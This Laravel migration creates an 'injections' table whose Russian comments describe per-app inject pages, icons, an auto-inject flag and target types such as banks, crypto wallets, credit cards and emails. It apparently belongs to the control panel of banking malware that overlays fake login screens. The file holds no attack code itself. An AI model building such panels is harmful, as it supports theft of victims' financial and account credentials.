<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateInjectionsTable extends Migration
{
    /**
     * Run the migrations.
     */
    public function up(): void
    {
        Schema::create('injections', function (Blueprint $table) {
            $table->id();

            $table->string('application')
                ->unique()
                ->comment("Приложение");

            $table->string('name')
                ->comment("Название инжекта для панели");

            $table->string('html')
                ->comment("Относительный путь к html");

            $table->string('image')
                ->comment("Относительный путь к иконке");

            $table->enum('type', ['banks', 'crypt', 'wallets', 'shops', 'credit_cards', 'emails'])
                ->comment("Доступные варианты: 'banks', 'crypt', 'wallets', 'shops', 'credit_cards', 'emails'");

            $table->boolean('auto')
                ->default(false)
                ->comment('Флаг определяющий автоинжект.');
        });
    }

    /**
     * Reverse the migrations.
     */
    public function down(): void
    {
        Schema::dropIfExists('injections');
    }
}
